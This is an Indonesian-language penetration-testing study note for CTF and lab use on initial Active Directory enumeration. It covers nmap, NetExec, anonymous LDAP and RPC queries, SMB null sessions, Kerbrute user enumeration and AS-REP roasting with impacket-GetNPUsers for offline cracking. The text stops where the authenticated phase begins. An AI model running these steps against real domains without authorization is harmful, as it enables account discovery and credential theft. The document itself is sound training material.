---
id: "35"
title: "🏰 35 — Active Directory Initial Enumeration Workflow"
category: "4. Active Directory"
categoryId: "ad"
filename: "35_ad_initial_enumeration_workflow.md"
refs_out: ["05","06","07","11","12","14a","14b","34","36","37","38","42","45"]
refs_in: ["04","05","08","09","11","12","14b","14c","14d","22","32","34","36","41","42","44","45","46","63","64"]
---

# 🏰 35 — Active Directory Initial Enumeration Workflow

← [File 34: OAuth & SSO](/docs/oauth-sso)  
→ [File 36: BloodHound](/docs/ad-bloodhound)

> **Scope:** CTF, HTB, TryHackMe, Proving Grounds, dan lab yang memang Anda punya izin untuk uji.  
> **OS attacker:** Parrot OS XFCE / Debian-based  
> **Target:** Windows Active Directory environment  
> **Goal:** dari **zero knowledge → konfirmasi domain → unauthenticated enumeration → credentials pertama → authenticated enumeration → menyiapkan data untuk BloodHound**.
> 
> ⚠️ **WARNING:** Beberapa teknik dalam workflow ini seperti password spraying dan AS-REP roasting dapat menghasilkan lockout atau network noise pada environment nyata. Untuk belajar, prioritaskan CTF/lab. Jangan menjalankan teknik tersebut terhadap production tanpa otorisasi eksplisit.

---

# 🧭 NAVIGATION

← [File 34: OAuth & SSO](/docs/oauth-sso)
→ [File 36: BloodHound](/docs/ad-bloodhound)

---

# 🧠 BAGIAN 0 — KONTEKS & KAPAN DIGUNAKAN

# 0.1 🏢 Apa Itu Active Directory

## 🧳 Analogi Sederhana

Bayangkan sebuah sekolah besar.

Ada:

```text
Sekolah
│
├── Murid
├── Guru
├── Staff
├── Komputer lab
├── Ruang administrasi
└── Kartu akses
```

Daripada setiap komputer memiliki:

```text
username
password
permission
```

sendiri-sendiri, sekolah membuat satu sistem pusat:

```text
                    "Central Office"
                         │
        ┌────────────────┼─────────────────┐
        │                │                 │
        ▼                ▼                 ▼
      User            Computer           Group
        │                │                 │
        └────────────────┼─────────────────┘
                         │
                         ▼
                    Permissions
```

Dalam dunia Windows enterprise, konsep ini diwujudkan dengan **Active Directory Domain Services (AD DS)**.

---

## 🧱 Active Directory Secara Sederhana

AD menyimpan dan mengelola:

```text
Users
Groups
Computers
Organizational Units
Policies
Service Accounts
Security Objects
Trusts
```

Domain Controller (DC) menjalankan layanan yang membuat domain berfungsi.

---

# 🆚 Domain Windows vs Standalone Windows

|Karakteristik|Standalone Windows|Domain Windows / AD|
|---|---|---|
|Authentication|Lokal|Domain + lokal|
|Central user database|Tidak|Ya|
|Domain Controller|Tidak|Ya|
|Kerberos|Umumnya tidak|Ya|
|LDAP directory|Tidak|Ya|
|Group Policy terpusat|Terbatas|Ya|
|Domain accounts|Tidak|Ya|
|Trust relationships|Tidak|Ya|
|Enterprise management|Terbatas|Sangat umum|

---

## 🧠 Mental Model

Standalone:

```text
PC-A
 ├── Administrator
 ├── User1
 └── User2
```

AD:

```text
                DOMAIN
                  │
        ┌─────────┼─────────┐
        ▼         ▼         ▼
       DC        User      Groups
        │
        ├── Computer A
        ├── Computer B
        ├── Server A
        └── Server B
```

---

# 🔍 Kenapa AD Sering Muncul di CTF?

Karena satu domain dapat memberikan attack surface yang sangat besar.

Misalnya:

```text
Web Server
   ↓
Credentials
   ↓
Domain User
   ↓
LDAP/SMB/Kerberos
   ↓
More Users
   ↓
Service Accounts
   ↓
ACLs
   ↓
Delegation
   ↓
Domain Admin
```

Jadi AD CTF hampir selalu merupakan:

```text
ENUMERATION GAME
```

Bukan sekadar:

```text
find exploit
→ execute
→ root
```

---

# 🔎 Cara Tahu Target Adalah AD Environment

Cari kombinasi service:

```text
88
389
445
464
636
3268
3269
```

Yang paling kuat:

```text
88   = Kerberos
389  = LDAP
445  = SMB
3268 = Global Catalog
3269 = Global Catalog over TLS
```

Satu port sendiri belum membuktikan AD.

Contoh:

```text
Port 445 open
      ↓
bisa SMB
      ↓
belum pasti DC
```

Tetapi:

```text
88 + 389 + 445 + 3268
      ↓
strong AD/DC indicator
```

---

# 0.2 🚪 Kapan File Ini Digunakan

Gunakan workflow ini ketika hasil network reconnaissance menunjukkan kemungkinan:

```text
Windows environment
+
SMB
+
Kerberos
+
LDAP
```

---

## 🎯 Trigger

Masuk ke workflow ini jika:

```text
[ ] Port 88 ditemukan
[ ] Port 389 ditemukan
[ ] Port 445 ditemukan
[ ] Port 636 ditemukan
[ ] Port 3268 ditemukan
[ ] Port 3269 ditemukan
[ ] SMB banner menunjukkan domain
[ ] LDAP RootDSE menunjukkan naming context
[ ] Kerberos realm/domain terdeteksi
```

---

# 🧭 Port AD yang Harus Dihafal

|Port|Service|Apa Artinya|
|--:|---|---|
|53|DNS|Sering sangat penting untuk domain resolution|
|88|Kerberos|Authentication|
|135|MSRPC|Windows RPC|
|139|NetBIOS/SMB|Legacy SMB|
|389|LDAP|Directory services|
|445|SMB|File/share + Windows network services|
|464|Kerberos password change|Supporting Kerberos|
|636|LDAPS|LDAP over TLS|
|3268|Global Catalog|Forest-wide directory queries|
|3269|Global Catalog over TLS|Secure GC|
|5985|WinRM HTTP|Remote management|
|5986|WinRM HTTPS|Secure remote management|

---

# 🔍 Konfirmasi Domain Controller

Basic Nmap:

```bash
# Scan common Active Directory ports
nmap -Pn -p 53,88,135,139,389,445,464,636,3268,3269 10.10.10.x

# Run SMB/LDAP-oriented NSE scripts
nmap -Pn -p 88,389,445,636,3268,3269 \
  --script smb-os-discovery,smb2-security-mode,ldap-rootdse \
  10.10.10.x
```

Jika melihat:

```text
88/tcp   open  kerberos-sec
389/tcp  open  ldap
445/tcp  open  microsoft-ds
3268/tcp open  globalcatLDAP
```

maka:

```text
AD/DC suspicion = HIGH
```

---

# 0.3 🧠 Mindset AD Enumeration

## Web vs AD

Web enumeration biasanya:

```text
Domain
 ↓
Subdomain
 ↓
Directory
 ↓
Endpoint
 ↓
Parameter
```

AD enumeration:

```text
Domain
 ↓
Users
 ↓
Groups
 ↓
Computers
 ↓
Shares
 ↓
SPNs
 ↓
GPO
 ↓
Trust
 ↓
ACL
 ↓
Delegation
 ↓
Attack Path
```

---

# 🐢 Konsep "Low and Slow"

AD memiliki banyak mekanisme security:

```text
account lockout
logging
SIEM
EDR
IDS
password policy
Kerberos controls
```

Karena itu mindset:

```text
Don't spray blindly.
Don't brute force blindly.
Don't scan everything repeatedly.
```

Lebih baik:

```text
enumerate
 ↓
understand
 ↓
prioritize
 ↓
test
```

---

# 🎯 Apa yang Dicari?

```text
Users
Groups
Computers
Domain Controllers
Shares
Policies
GPOs
SPNs
Service Accounts
Trusts
Delegation
ACLs
Interesting descriptions
Passwords
Scripts
Configuration files
```

---

# 🧩 MASTER AD ENUMERATION MODEL

```text
                         AD DOMAIN
                            │
           ┌────────────────┼─────────────────┐
           │                │                 │
           ▼                ▼                 ▼
         USERS            GROUPS          COMPUTERS
           │                │                 │
           └────────────────┼─────────────────┘
                            │
                            ▼
                          SHARES
                            │
                            ▼
                      PASSWORD/POLICY
                            │
                            ▼
                           GPO
                            │
             ┌──────────────┼──────────────┐
             ▼              ▼              ▼
            SPN           TRUSTS       DELEGATION
             │              │              │
             └──────────────┼──────────────┘
                            ▼
                       ATTACK PATH
                            │
                            ▼
                      BLOODHOUND
```

---

# 🧰 BAGIAN 1 — SETUP & TOOLS

# 1.1 🛠️ Tools yang Dibutuhkan

> **Catatan tooling modern:** CrackMapExec telah banyak digantikan oleh **NetExec (`nxc`)** dalam workflow AD modern. Secara konsep, dokumentasi lama yang menggunakan `crackmapexec` sering kali dapat diterjemahkan menjadi command `nxc`. Untuk CTF, pahami keduanya agar tidak bingung ketika walkthrough lama menggunakan nama `cme`.

---

## 🗺️ Tool Matrix

|Tool|Fungsi|
|---|---|
|`nmap`|Service discovery|
|`nxc` / CrackMapExec|SMB/LDAP/WinRM enumeration|
|`enum4linux-ng`|Windows/SMB/LDAP enumeration|
|`ldapsearch`|LDAP queries|
|`rpcclient`|MS-RPC enumeration|
|`smbclient`|SMB share interaction|
|`smbmap`|Share/permission enumeration|
|`kerbrute`|Kerberos user enumeration|
|Impacket|Kerberos/SMB/LDAP tooling|
|BloodHound CE|Attack-path graph|
|`bloodhound-ce-python`|Linux BloodHound collector|
|SharpHound|Windows BloodHound collector|
|PowerView|Advanced AD enumeration from Windows|

### 🔧 Koreksi Teknis Minor

**Koreksi 1 — impacket-GetADUsers Format**
```bash
# ❌ FORMAT DI FILE (kurang umum):
impacket-GetADUsers "$DOMAIN/$USERNAME:$PASSWORD" -all -dc-ip "$DC_IP"

# ✅ FORMAT YANG LEBIH UMUM (kedua bisa benar, tapi ini lebih standard):
impacket-GetADUsers -all -dc-ip "$DC_IP" "$DOMAIN/$USERNAME:$PASSWORD"
```
*Catatan:* kedua format dapat berjalan, tetapi format kedua lebih konsisten dengan cara tool impacket lainnya bekerja.

**Koreksi 2 — BloodHound CE Python Package Name**
> Package name `bloodhound-ce-python` mungkin belum tersedia di semua repositori Parrot OS.
>
> **Alternatif yang lebih reliable:**
> ```bash
> pipx install bloodhound-ce
> # atau
> pip install git+https://github.com/dirkjanm/BloodHound.py
> ```
> Beri peringatan bahwa nama paket dapat berubah.

**Koreksi 3 — Perbaikan Command nxc**
```bash
# ❌ DI FILE:
nxc smb "$DC_IP" --os-version

# ✅ YANG LEBIH AKURAT:
# --os-version bukan flag standar nxc
# OS version biasanya sudah muncul dari output dasar:
nxc smb "$DC_IP"
# Output sudah mencakup OS version, contoh: "Windows Server 2019 17763 x64"
```

**💡 Tambahan — /etc/hosts Entry**
Sering kali pemula lupa menambahkan entri host untuk resolusi nama.
```bash
# Tambahkan ke /etc/hosts setelah mendapatkan domain name dan DC hostname
echo "$DC_IP  DC01.corp.local corp.local" | sudo tee -a /etc/hosts

# Verifikasi
ping -c 1 corp.local
ping -c 1 DC01.corp.local
```

---

# 🧰 Nmap

```bash
# Check Nmap version
nmap --version
```

Expected:

```text
Nmap version 7.x
```

---

# 🧰 NetExec / CrackMapExec

Modern:

```bash
# Check NetExec version
nxc --version
```

Legacy:

```bash
# Check legacy CrackMapExec version if installed
crackmapexec --version
```

Install NetExec:

```bash
# Update package index
sudo apt update

# Install NetExec when available in the Parrot repository
sudo apt install -y netexec

# Verify installation
nxc --version
```

Jika package tidak tersedia:

```bash
# Check whether the package exists in configured repositories
apt-cache policy netexec

# Search related package names
apt-cache search netexec
```

---

# 🧰 enum4linux-ng

```bash
# Install enum4linux-ng
sudo apt update
sudo apt install -y enum4linux-ng

# Check version
enum4linux-ng --version
```

Jika tersedia melalui Python package environment:

```bash
# Create a dedicated virtual environment
python3 -m venv ~/tools/enum4linux-ng-venv

# Activate the environment
source ~/tools/enum4linux-ng-venv/bin/activate

# Upgrade pip
python3 -m pip install --upgrade pip

# Install enum4linux-ng
python3 -m pip install enum4linux-ng

# Check the installed command
enum4linux-ng --version
```

---

# 🧰 ldapsearch

Package Debian/Parrot:

```bash
# Install LDAP client tools
sudo apt update
sudo apt install -y ldap-utils

# Check ldapsearch version
ldapsearch -VV
```

---

# 🧰 rpcclient / smbclient

```bash
# Install Samba client utilities
sudo apt update
sudo apt install -y smbclient

# Check rpcclient
rpcclient --version

# Check smbclient
smbclient --version
```

---

# 🧰 smbmap

```bash
# Install smbmap when available
sudo apt update
sudo apt install -y smbmap

# Check version/help
smbmap --version

# Display help if version flag is unsupported
smbmap -h
```

---

# 🧰 Kerbrute

Jika repository Parrot tidak menyediakan binary:

```bash
# Check whether Kerbrute is available as an installed command
kerbrute --help
```

Jika menggunakan Go:

```bash
# Check Go installation
go version

# Install Kerbrute from its Go module
go install github.com/ropnop/kerbrute@latest

# Add the Go binary directory to PATH for this shell
export PATH="$PATH:$(go env GOPATH)/bin"

# Verify Kerbrute
kerbrute --help
```

> Exact package availability can differ between Parrot repositories. The important part is that the final executable is available as `kerbrute`.

---

# 🧰 Impacket Suite

```bash
# Install Impacket from the Python package manager
python3 -m pipx install impacket

# Check Impacket tools
impacket-GetADUsers -h

# Check GetUserSPNs
impacket-GetUserSPNs -h

# Check GetNPUsers
impacket-GetNPUsers -h
```

Jika `pipx` belum tersedia:

```bash
# Install pipx
sudo apt update
sudo apt install -y pipx

# Ensure pipx binaries are available
pipx ensurepath
```

Tools penting:

```text
GetADUsers.py
GetUserSPNs.py
GetNPUsers.py
GetUserSPNs
GetNPUsers
secretsdump
rpcdump
lookupsid
```

---

# 🩸 BloodHound + SharpHound

Current BloodHound CE deployments use a CE-specific Python ingestor called:

```text
bloodhound-ce-python
```

dan bukan legacy `bloodhound-python`. Current Kali packaging explicitly distinguishes the CE ingestor from the legacy tool.

Install:

```bash
# Install BloodHound Community Edition client
sudo apt update
sudo apt install -y bloodhound-ce-python

# Verify CE ingestor
bloodhound-ce-python --help
```

Alternative isolated Python environment:

```bash
# Install the CE Python ingestor with pipx
pipx install bloodhound-ce

# Verify the command
bloodhound-ce-python --help
```

---

# 🩸 SharpHound

SharpHound biasanya dijalankan pada:

```text
Windows host
```

Contoh command setelah `SharpHound.exe` tersedia di lab:

```text
SharpHound.exe -c All --zipfilename ad_collection.zip
```

**Pahami konsepnya terlebih dahulu:**

```text
SharpHound
    ↓
collect AD relationships
    ↓
ZIP/JSON
    ↓
BloodHound
```

BloodHound CE sendiri menggunakan SharpHound sebagai salah satu collector dan menyediakan `bloodhound-ce-python` sebagai collector Linux-native.

---

# 🪟 PowerView

PowerView digunakan dari:

```text
Windows PowerShell
```

Fungsi utama:

```text
Domain enumeration
User enumeration
Group enumeration
Computer enumeration
ACL enumeration
Trust enumeration
GPO enumeration
```

Untuk CTF, PowerView biasanya ditempatkan pada Windows lab melalui **lab-provided tooling**.

Setelah script tersedia:

```text
. .\PowerView.ps1
```

Contoh command:

```text
Get-Domain
Get-DomainUser
Get-DomainGroup
Get-DomainComputer
Get-DomainTrust
Get-DomainGPO
```

> Command di atas adalah PowerShell karena PowerView memang Windows/PowerShell tooling; command Linux tetap ditulis sebagai `bash` pada bagian lain workflow.

---

# 1.2 🌱 Setup Environment Variables

Buat variable:

```bash
# Set the Active Directory domain
export DOMAIN="domain.local"

# Set Domain Controller IP
export DC_IP="10.10.10.x"

# Set username once credentials are discovered
export USERNAME=""

# Set password once credentials are discovered
export PASSWORD=""

# Set attacker IP for later lab operations
export LHOST="10.10.14.x"
```

---

# 🧠 Kenapa Variable Penting?

Tanpa variable:

```bash
# Repeatedly type the domain manually
nxc smb 10.10.10.x -d domain.local -u user -p password
ldapsearch -H ldap://10.10.10.x ...
```

Dengan variable:

```bash
# Reuse target variables consistently
nxc smb "$DC_IP" -d "$DOMAIN" -u "$USERNAME" -p "$PASSWORD"
```

Keuntungannya:

```text
less typing
less typo
faster workflow
easier notes
easier copy/paste
```

---

# 🗂️ Suggested Lab Directory

```bash
# Create an AD lab workspace
mkdir -p ~/labs/ad/{recon,users,groups,computers,shares,ldap,kerberos,bloodhound,evidence}

# Enter the AD lab directory
cd ~/labs/ad

# Show current working directory
pwd
```

---

# 💥 BAGIAN 2 — FASE 1: UNAUTHENTICATED ENUM

> **Goal fase ini:** mendapatkan informasi sebanyak mungkin **tanpa credentials**.

Mental model:

```text
NO PASSWORD
    ↓
"What will the DC tell me?"
    ↓
SMB
LDAP
RPC
Kerberos
DNS
    ↓
Potential first foothold
```

---

# 2.1 🔎 Konfirmasi Domain Controller

## Step 1 — Nmap

```bash
# Scan common AD/DC ports
nmap -Pn -p 53,88,135,139,389,445,464,636,3268,3269 "$DC_IP"

# Run SMB OS and security discovery
nmap -Pn -p 445 \
  --script smb-os-discovery,smb2-security-mode \
  "$DC_IP"

# Query LDAP RootDSE
nmap -Pn -p 389 \
  --script ldap-rootdse \
  "$DC_IP"
```

---

## Contoh Output

```text
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
636/tcp  open  ldaps
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
```

### Analisis

Jika:

```text
88 open
389 open
445 open
3268 open
```

maka hypothesis:

```text
This host is very likely a Domain Controller.
```

Tetapi masih lakukan verification.

---

# Step 2 — NetExec / CrackMapExec SMB

```bash
# Check SMB negotiation against the DC without credentials
nxc smb "$DC_IP"

# Legacy CrackMapExec equivalent
crackmapexec smb "$DC_IP"
```

Contoh output realistis:

```text
SMB         10.10.10.10     445    DC01             [*] Windows Server 2019 Standard 17763 x64 (name:DC01) (domain:CORP.LOCAL) (signing:True) (SMBv1:False)
```

---

## Analisis Output

Perhatikan:

```text
Windows Server 2019
```

→ OS fingerprint.

```text
name:DC01
```

→ NetBIOS/computer name.

```text
domain:CORP.LOCAL
```

→ domain name.

```text
signing:True
```

→ SMB signing enabled.

```text
SMBv1:False
```

→ SMBv1 disabled.

---

# Step 3 — LDAP Anonymous RootDSE

```bash
# Query RootDSE anonymously
ldapsearch -x \
  -H "ldap://$DC_IP" \
  -s base \
  -b "" \
  namingContexts defaultNamingContext rootDomainNamingContext
```

Contoh output:

```text
dn:
namingContexts: DC=corp,DC=local
defaultNamingContext: DC=corp,DC=local
rootDomainNamingContext: DC=corp,DC=local
```

---

# 🧠 Analisis

Jika melihat:

```text
defaultNamingContext: DC=corp,DC=local
```

maka:

```text
LDAP naming context = corp.local
```

Sekarang:

```bash
# Set the discovered domain
export DOMAIN="corp.local"
```

---

# ✅ DC Confirmation Model

```text
Nmap
 ↓
88/389/445/3268
 ↓
NetExec identifies domain
 ↓
LDAP RootDSE returns namingContext
 ↓
CONFIRMED AD ENVIRONMENT
```

---

# 2.2 🌐 Domain Information Gathering

Setelah domain confirmed, kumpulkan:

```text
Domain name
NetBIOS name
DC hostname
OS
SMB signing
LDAP naming context
Kerberos realm
```

---

# Domain Name

```bash
# Query SMB metadata
nxc smb "$DC_IP"
```

Expected:

```text
domain:CORP.LOCAL
```

---

# NetBIOS Name

```bash
# Ask SMB for server name/domain information
nmblookup -A "$DC_IP"
```

Contoh:

```text
Looking up status of 10.10.10.10
        DC01           <00> -         B <ACTIVE>
        CORP           <00> - <GROUP> B <ACTIVE>
        CORP           <1c> - <GROUP> B <ACTIVE>
        CORP           <1b> -         B <ACTIVE>
```

Analisis:

```text
DC01
 ↓
computer/server name

CORP
 ↓
NetBIOS domain name
```

---

# OS Version

```bash
# Enumerate Windows OS information through SMB
nxc smb "$DC_IP" --os-version
```

Representative output:

```text
SMB  10.10.10.10  445  DC01  Windows Server 2019 17763 x64
```

---

# SMB Signing

```bash
# Check SMB signing requirements
nxc smb "$DC_IP" --gen-relay-list /tmp/smb-relay-candidates.txt
```

At minimum inspect the base SMB result:

```text
signing:True
```

### Interpretation

```text
signing:True
```

→ SMB signing required/enforced in the observed result.

```text
signing:False
```

→ potentially interesting for relay-oriented labs.

> Jangan menganggap `signing:False` otomatis berarti relay exploit berhasil. Itu hanya salah satu prerequisite.

---

# 2.3 🪟 SMB Null Session

## Apa Itu Null Session?

Null session berarti mengakses layanan Windows/SMB/RPC tanpa credentials.

Konsep:

```text
Username = ""
Password = ""
```

Bukan:

```text
username = guest
```

Null session dan Guest access adalah konsep berbeda.

---

# Kenapa Powerful?

Karena jika dikonfigurasi lemah, attacker dapat memperoleh:

```text
usernames
groups
domain information
shares
RID information
policy hints
```

---

# Step 1 — SMB Anonymous

```bash
# Test anonymous SMB connection
smbclient -L "//$DC_IP/" -N
```

Contoh:

```text
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
NETLOGON        Disk      Logon server share
SYSVOL          Disk      Logon server share
```

---

# Analisis

```text
ADMIN$
```

→ administrative share.

```text
C$
```

→ administrative disk share.

```text
IPC$
```

→ inter-process communication.

```text
NETLOGON
```

→ domain logon-related files/scripts.

```text
SYSVOL
```

→ Group Policy/domain replication content.

**SYSVOL dan NETLOGON sangat penting untuk enumeration.**

---

# Step 2 — Anonymous Share Enumeration dengan NetExec

```bash
# Enumerate accessible shares without credentials
nxc smb "$DC_IP" -u '' -p '' --shares
```

Representative:

```text
SMB  10.10.10.10  445  DC01  [*] Windows Server 2019 17763 x64
SMB  10.10.10.10  445  DC01  [+] CORP.LOCAL\:
SMB  10.10.10.10  445  DC01  [*] Enumerated shares
SMB  10.10.10.10  445  DC01  Share       Permissions
SMB  10.10.10.10  445  DC01  -----       -----------
SMB  10.10.10.10  445  DC01  ADMIN$      READ
SMB  10.10.10.10  445  DC01  IPC$        READ
SMB  10.10.10.10  445  DC01  NETLOGON    READ
SMB  10.10.10.10  445  DC01  SYSVOL      READ
```

---

# Step 3 — Connect ke Share

```bash
# Connect anonymously to SYSVOL
smbclient "//$DC_IP/SYSVOL" -N

# List top-level contents
smb: \> ls
```

Concept output:

```text
.                                   D
..                                  D
CORP.LOCAL                          D
```

---

# Masuk

```text
smb: \> cd CORP.LOCAL
smb: \CORP.LOCAL\> ls
```

---

# 📌 Apa yang Dicari?

Dalam `SYSVOL`/`NETLOGON`, cari:

```text
*.ps1
*.bat
*.cmd
*.vbs
*.xml
Groups.xml
scripts
startup scripts
logon scripts
configuration files
```

Kenapa?

Karena environment yang salah konfigurasi dapat meninggalkan:

```text
password
service credential
script credential
configuration secrets
```

---

# 2.4 🗂️ LDAP Anonymous Bind

## Kapan Berhasil?

LDAP anonymous bind berhasil jika server memperbolehkan anonymous access untuk operasi yang Anda lakukan.

Penting:

```text
Anonymous RootDSE works
        ≠
Anonymous directory enumeration works
```

RootDSE bisa terbaca sementara subtree query ditolak.

---

# Step 1 — RootDSE

```bash
# Query LDAP RootDSE
ldapsearch -x \
  -H "ldap://$DC_IP" \
  -s base \
  -b "" \
  "*"
```

---

# Step 2 — Query Domain Root

```bash
# Query objects in the domain naming context
ldapsearch -x \
  -H "ldap://$DC_IP" \
  -b "DC=${DOMAIN//./,DC=}" \
  -s sub \
  "(objectClass=domain)"
```

Namun shell variable replacement untuk domain LDAP dapat terasa membingungkan.

Untuk pemula, lebih mudah menyimpan DN:

```bash
# Store the Base DN explicitly
export BASE_DN="DC=corp,DC=local"

# Query the domain object
ldapsearch -x \
  -H "ldap://$DC_IP" \
  -b "$BASE_DN" \
  -s base \
  "(objectClass=domain)"
```

---

# Step 3 — Query Users

```bash
# Search for domain user objects
ldapsearch -x \
  -H "ldap://$DC_IP" \
  -b "$BASE_DN" \
  "(objectCategory=person)" \
  sAMAccountName userPrincipalName description
```

---

# Contoh Output

```text
dn: CN=Alice Admin,CN=Users,DC=corp,DC=local
sAMAccountName: alice
userPrincipalName: alice@corp.local
description: Helpdesk Administrator

dn: CN=Bob User,CN=Users,DC=corp,DC=local
sAMAccountName: bob
userPrincipalName: bob@corp.local
description: Standard user

dn: CN=svc_backup,CN=Users,DC=corp,DC=local
sAMAccountName: svc_backup
description: Backup Service Account
```

---

# 🧠 Cara Parse LDAP

Output LDAP panjang karena satu object mempunyai banyak attribute.

Gunakan:

```text
dn:
```

sebagai:

```text
"Object apa ini dan berada di mana?"
```

Contoh:

```text
dn: CN=Alice Admin,CN=Users,DC=corp,DC=local
```

Berarti:

```text
CN=Alice Admin
        ↓
Common Name

CN=Users
        ↓
Container

DC=corp
DC=local
        ↓
Domain
```

---

# Attribute Penting

|Attribute|Arti|
|---|---|
|`sAMAccountName`|Username Windows|
|`userPrincipalName`|Format `user@domain`|
|`displayName`|Nama display|
|`description`|Description object|
|`memberOf`|Group membership|
|`servicePrincipalName`|SPN|
|`pwdLastSet`|Informasi password timestamp|
|`lastLogon`|Last logon info|
|`userAccountControl`|Flags akun|
|`objectSid`|SID object|
|`distinguishedName`|DN|
|`primaryGroupID`|Primary group|

---

# 🔎 Search SPN dari LDAP

```bash
# Find objects containing a servicePrincipalName
ldapsearch -x \
  -H "ldap://$DC_IP" \
  -b "$BASE_DN" \
  "(servicePrincipalName=*)" \
  sAMAccountName servicePrincipalName
```

Jika melihat:

```text
sAMAccountName: svc_sql
servicePrincipalName: MSSQLSvc/db01.corp.local:1433
```

Maka:

```text
service account
+
SPN
↓
potential Kerberoasting candidate
```

---

# 2.5 🛰️ RPC Enumeration

## Null Session

```bash
# Connect to MS-RPC anonymously
rpcclient -U "" -N "$DC_IP"
```

Jika berhasil:

```text
rpcclient $>
```

Jika:

```text
NT_STATUS_ACCESS_DENIED
```

berarti null session ditolak untuk operasi tersebut.

---

# Enum Domain Users

Dalam `rpcclient`:

```text
rpcclient $> enumdomusers
```

Contoh output:

```text
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[alice] rid:[0x452]
user:[bob] rid:[0x453]
user:[svc_backup] rid:[0x454]
```

---

# 🧠 Parse Output

```text
user:[alice]
```

→ username.

```text
rid:[0x452]
```

→ Relative Identifier.

SID konsep:

```text
DOMAIN-SID
   +
RID
```

Contoh:

```text
S-1-5-21-111111111-222222222-333333333-1106
```

RID:

```text
1106
```

---

# Enum Domain Groups

```text
rpcclient $> enumdomgroups
```

Contoh:

```text
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Computers] rid:[0x203]
group:[Account Operators] rid:[0x224]
group:[Backup Operators] rid:[0x227]
```

---

# Query Specific User

```text
rpcclient $> queryuser 0x452
```

Contoh konsep:

```text
User Name   : alice
Full Name   : Alice Admin
Description : Helpdesk Administrator
User Account Control: 0x0200
```

---

# Query Domain Info

```text
rpcclient $> querydominfo
```

Cari:

```text
Domain:
Users:
Groups:
Aliases:
```

Contoh:

```text
Domain:
    CORP
Users:
    32
Groups:
    18
```

---

# 🧹 Keluar

```text
rpcclient $> exit
```

---

# 2.6 🧰 Enum4linux-ng

## Kenapa Dipakai?

`enum4linux-ng` merupakan:

```text
SMB
+
RPC
+
LDAP
```

enumeration helper.

Bagus untuk:

```text
quick baseline
```

tetapi:

```text
tidak menggantikan manual enumeration
```

---

# All-in-One

```bash
# Run broad enumeration against the DC
enum4linux-ng -A "$DC_IP"
```

Simpan:

```bash
# Save enumeration output for analysis
enum4linux-ng -A "$DC_IP" | tee ~/labs/ad/recon/enum4linux-ng.txt
```

---

# Contoh Output

```text
[*] Target Information
[*] Target: 10.10.10.10
[*] NetBIOS domain name: CORP
[*] NetBIOS computer name: DC01
[*] FQDN: DC01.corp.local
[*] OS: Windows Server 2019

[*] Enumerating Workgroup/Domain
[+] Domain: CORP
[+] SID: S-1-5-21-111111111-222222222-333333333

[*] Enumerating Users
user:[Administrator]
user:[Guest]
user:[krbtgt]
user:[alice]
user:[bob]

[*] Enumerating Shares
ADMIN$
C$
IPC$
NETLOGON
SYSVOL
```

---

# 🧠 Cara Membaca

Urutan baca:

```text
1. Target
2. Domain
3. SID
4. Users
5. Groups
6. Shares
7. Policies
```

Jangan mencoba memahami semua output sekaligus.

---

# 🎯 Output → Next Action

```text
Domain found
   ↓
Set $DOMAIN
```

```text
Users found
   ↓
Save users.txt
```

```text
SYSVOL found
   ↓
Inspect scripts/GPO
```

```text
RID/SID found
   ↓
Understand domain structure
```

---

# 2.7 🔥 AS-REP Roasting — No Credentials

## Apa Itu?

Kerberos normalnya meminta pre-authentication untuk sebagian account.

Jika user dikonfigurasi:

```text
Do not require Kerberos preauthentication
```

attacker dapat meminta material AS-REP untuk user tersebut **tanpa mengetahui password user**.

Konsep:

```text
Username known
      +
Pre-auth disabled
      ↓
Kerberos AS-REP
      ↓
Offline crackable material
```

---

# ⚠️ Ini Bukan "Brute Force"

Attacker tidak perlu:

```text
password1
password2
password3
```

terhadap service.

Sebaliknya:

```text
enumerate username
       ↓
ask Kerberos
       ↓
receive AS-REP material
       ↓
offline cracking
```

---

# Step 1 — Prepare Users

Misalnya `users.txt`:

```text
administrator
alice
bob
svc_backup
krbtgt
```

---

# Step 2 — Kerbrute User Enumeration

```bash
# Test which usernames exist in the domain through Kerberos
kerbrute userenum \
  --dc "$DC_IP" \
  -d "$DOMAIN" \
  users.txt
```

Representative:

```text
[+] VALID USERNAME:       alice@corp.local
[+] VALID USERNAME:       bob@corp.local
[+] VALID USERNAME:       svc_backup@corp.local
[-] bob2@corp.local
```

---

# 🧠 Analisis

Jika:

```text
VALID USERNAME
```

→ username likely exists.

Simpan hasil:

```bash
# Extract likely valid usernames into a working file
kerbrute userenum \
  --dc "$DC_IP" \
  -d "$DOMAIN" \
  users.txt | tee ~/labs/ad/kerberos/kerbrute-users.txt
```

---

# Step 3 — GetNPUsers

Impacket tool:

```bash
# Request AS-REP material for users without requiring domain credentials
impacket-GetNPUsers "$DOMAIN/" \
  -dc-ip "$DC_IP" \
  -usersfile users.txt \
  -format hashcat \
  -outputfile ~/labs/ad/kerberos/asrep.txt \
  -no-pass
```

---

# Contoh Output

```text
$krb5asrep$23$svc_backup@CORP.LOCAL:...
```

Yang paling penting:

```text
$krb5asrep$
```

Artinya:

```text
AS-REP roastable material
```

---

# 🧠 Flow AS-REP

```text
Username
   ↓
Kerbrute
   ↓
Valid account?
   ↓
GetNPUsers
   ↓
Pre-auth disabled?
   │
  YES
   ↓
AS-REP material
   ↓
Hashcat/offline cracking
   ↓
Password
   ↓
Credentials
```

---

# Next Step Jika Mendapat Hash

Simpan:

```bash
# Preserve the AS-REP material
cp ~/labs/ad/kerberos/asrep.txt ~/labs/ad/evidence/

# Inspect the file
cat ~/labs/ad/kerberos/asrep.txt
```

Kemudian lakukan offline cracking sesuai format hash yang didapat pada **lab/CTF**.

Contoh:

```bash
# Identify the format before selecting a hashcat mode
hashcat --example-hashes | grep -i asrep
```

Setelah password diperoleh:

```bash
# Store the lab credential in shell variables
export USERNAME="svc_backup"
export PASSWORD="LAB_CRACKED_PASSWORD"
```

Lanjut ke:

```text
FASE 2 — AUTHENTICATED ENUM
```

---

# 🔑 BAGIAN 3 — FASE 2: AUTHENTICATED ENUM

> Trigger:
> 
> ```text
> Got first domain credentials
> ```
> 
